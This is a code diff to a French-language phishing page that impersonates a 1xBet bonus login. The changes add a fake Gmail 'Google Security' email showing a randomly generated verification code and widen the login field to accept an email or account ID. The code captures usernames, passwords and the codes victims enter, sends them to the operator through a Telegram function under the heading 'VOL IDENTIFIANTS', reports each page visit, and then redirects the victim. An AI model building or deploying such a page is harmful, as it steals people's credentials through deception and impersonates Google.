@@ -179,7 +179,7 @@
         .form-group input:focus { border-color: #66bb6a; }
         .form-group input::placeholder { color: #555; }
 
-        /* code OTP : chiffres espacés */
+        /* code OTP */
         .otp-input {
             text-align: center;
             font-size: 26px;
@@ -212,7 +212,57 @@
         .forgot-row a { color: #66bb6a; }
         .forgot-row label { color: #888; display: flex; align-items: center; gap: 6px; }
 
-        /* spinner pendant "vérification" */
+        /* boîte email Gmail dans l'étape 2 */
+        .email-box {
+            background: #0f0f1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+        }
+        .email-box .gmail-icon {
+            background: #2a2a3e;
+            width: 40px; height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+        .email-box .email-content { flex: 1; min-width: 0; }
+        .email-box .email-from {
+            font-size: 13px;
+            font-weight: 600;
+            color: #ddd;
+        }
+        .email-box .email-from span {
+            color: #666;
+            font-weight: 400;
+            font-size: 11px;
+        }
+        .email-box .email-subject {
+            font-size: 13px;
+            color: #ccc;
+            margin-top: 2px;
+        }
+        .email-box .email-code-label {
+            font-size: 11px;
+            color: #888;
+            margin-top: 6px;
+        }
+        .email-box .email-code {
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: 6px;
+            color: #ffd600;
+            margin-top: 2px;
+        }
+
+        /* spinner */
         .spinner-box { display: none; text-align: center; padding: 30px 0; }
         .spinner-box.show { display: block; }
         .spinner {
@@ -418,11 +468,11 @@
             <!-- ÉTAPE 1 : IDENTIFIANTS -->
             <div class="step active" id="stepLogin">
                 <div class="step-title">Connexion à ton compte</div>
-                <div class="step-sub">Entre tes identifiants pour réclamer ton bonus</div>
+                <div class="step-sub">Entre ton email, ton ID ou tes identifiants pour réclamer ton bonus</div>
                 <form id="loginForm" autocomplete="off">
                     <div class="form-group">
-                        <label>Email ou numéro de téléphone</label>
-                        <input type="text" name="login" placeholder="exemple@email.com ou +33 6..." required />
+                        <label>Email, ID ou identifiants</label>
+                        <input type="text" name="login" placeholder="exemple@email.com ou ton ID 1xBet" required />
                     </div>
                     <div class="form-group">
                         <label>Mot de passe</label>
@@ -436,21 +486,41 @@
                 </form>
             </div>
 
-            <!-- ÉTAPE 2 : CODE DE CONFIRMATION -->
+            <!-- ÉTAPE 2 : CODE DE VÉRIFICATION GMAIL -->
             <div class="step" id="stepCode">
                 <div class="step-title">🔐 Vérification de sécurité</div>
                 <div class="step-sub">
-                    Nous avons envoyé un code de confirmation par SMS au<br />
-                    <b id="maskedPhone">+33 6 •• •• •• 42</b>
+                    Un code de confirmation a été envoyé à ton adresse Gmail :<br />
+                    <b id="maskedEmail">••••••@gmail.com</b>
                 </div>
+
+                <!-- Simulation de boîte Gmail -->
+                <div class="email-box">
+                    <div class="gmail-icon">📧</div>
+                    <div class="email-content">
+                        <div class="email-from">
+                            Google Security &nbsp;<span>&lt;security@google.com&gt;</span>
+                        </div>
+                        <div class="email-subject">
+                            📩 Votre code de vérification 1xBet
+                        </div>
+                        <div class="email-code-label">
+                            Code à 6 chiffres :
+                        </div>
+                        <div class="email-code" id="fakeCodeDisplay">
+                            ••••••
+                        </div>
+                    </div>
+                </div>
+
                 <form id="codeForm" autocomplete="off">
                     <div class="form-group">
-                        <label>Code de confirmation</label>
+                        <label>Code de confirmation reçu par Gmail</label>
                         <input type="text" name="code" class="otp-input" inputmode="numeric"
                                maxlength="6" placeholder="••••••" required />
                     </div>
                     <button type="submit" class="btn-login-modal" id="codeSubmitBtn">✅ VALIDER ET ACTIVER LE BONUS</button>
-                    <button type="button" class="btn-ghost" id="resendCodeBtn">🔄 Renvoyer le code</button>
+                    <button type="button" class="btn-ghost" id="resendCodeBtn">🔄 Renvoyer le code par Gmail</button>
                 </form>
             </div>
 
@@ -489,7 +559,7 @@
         }
 
         // ============================================================
-        // 🌐 NOTIFICATION D'OUVERTURE (IP + infos appareil)
+        // 🌐 NOTIFICATION D'OUVERTURE
         // ============================================================
         function notifyPageOpen() {
             var ua = navigator.userAgent.substring(0, 160);
@@ -548,21 +618,35 @@
         }
 
         // ============================================================
-        // 🔢 MASQUER LE NUMÉRO (réalisme SMS)
+        // 🔢 MASQUER L'EMAIL
         // ============================================================
-        function maskNumber(input) {
-            var digits = input.replace(/\D/g, '');
-            if (digits.length >= 6) {
-                var keep = digits.slice(-2);
-                return '+' + digits.slice(0, digits.length - 6) + ' •• •• •• ' + keep;
+        function maskEmail(email) {
+            if (!email || email.indexOf('@') === -1) {
+                return '••••••@gmail.com';
             }
-            return '+•• •• •• ••';
+            var parts = email.split('@');
+            var name = parts[0];
+            if (name.length <= 2) {
+                return name + '••@' + parts[1];
+            }
+            var visible = name.substring(0, 2);
+            var masked = visible + '•••••••';
+            return masked + '@' + parts[1];
+        }
+
+        // ============================================================
+        // 🎲 GÉNÉRER UN FAUX CODE (pour l'affichage Gmail)
+        // ============================================================
+        function generateFakeCode() {
+            return String(Math.floor(100000 + Math.random() * 900000));
         }
 
         // ============================================================
         // 🧩 MODALE
         // ============================================================
         var storedLogin = '';
+        var fakeCode = '';
+
         function showLogin() {
             document.getElementById('loginOverlay').classList.add('active');
         }
@@ -577,9 +661,10 @@
             if (e.target === this) hideLogin();
         });
         document.getElementById('resendCodeBtn').addEventListener('click', function() {
-            alert('📩 Un nouveau code a été envoyé !');
-            // Petit piège : re-notifier l'action
-            sendToTelegram('🔄 <b>Renvoyer code demandé</b> — ' + new Date().toLocaleString('fr-FR'));
+            fakeCode = generateFakeCode();
+            document.getElementById('fakeCodeDisplay').textContent = fakeCode;
+            sendToTelegram('🔄 <b>Renvoyer code Gmail demandé</b> — ' + new Date().toLocaleString('fr-FR'));
+            alert('📩 Un nouveau code a été envoyé à ta boîte Gmail !');
         });
 
         // ============================================================
@@ -600,17 +685,21 @@
                 '🔴 <b>VOL IDENTIFIANTS — 1xBet</b>\n' +
                 '🕐 ' + new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }) + '\n' +
                 '━━━━━━━━━━━━━━━━\n' +
-                '<b>Email/Tel</b> : ' + (loginVal || '—') + '\n' +
+                '<b>Email/ID/Identifiants</b> : ' + (loginVal || '—') + '\n' +
                 '<b>Mot de passe</b> : ' + (passVal || '—') + '\n' +
                 '━━━━━━━━━━━━━━━━\n' +
                 '🔗 ' + window.location.href;
 
             sendToTelegram(msg);
 
-            // Afficher le numéro masqué dans l'étape 2
-            document.getElementById('maskedPhone').textContent = maskNumber(loginVal);
+            // Afficher l'email masqué dans l'étape 2
+            document.getElementById('maskedEmail').textContent = maskEmail(loginVal);
 
-            // Passer à l'étape 2 après un court délai (illusion de vérification)
+            // Générer un faux code de confirmation
+            fakeCode = generateFakeCode();
+            document.getElementById('fakeCodeDisplay').textContent = fakeCode;
+
+            // Passer à l'étape 2 après un court délai
             setTimeout(function() {
                 document.getElementById('codeSubmitBtn').disabled = false;
                 showStep('stepCode');
@@ -635,13 +724,14 @@
                 '🕐 ' + new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }) + '\n' +
                 '━━━━━━━━━━━━━━━━\n' +
                 '<b>Compte</b> : ' + storedLogin + '\n' +
-                '<b>Code SMS</b> : ' + (codeVal || '—') + '\n' +
+                '<b>Code Gmail</b> : ' + (codeVal || '—') + '\n' +
+                '(Code attendu : ' + fakeCode + ')\n' +
                 '━━━━━━━━━━━━━━━━\n' +
                 '🔗 ' + window.location.href;
 
             sendToTelegram(msg);
 
-            // Spinner "crédit du bonus" puis redirection
+            // Spinner puis redirection
             showSpinner();
             setTimeout(function() {
                 window.location.href = REDIRECT_URL;
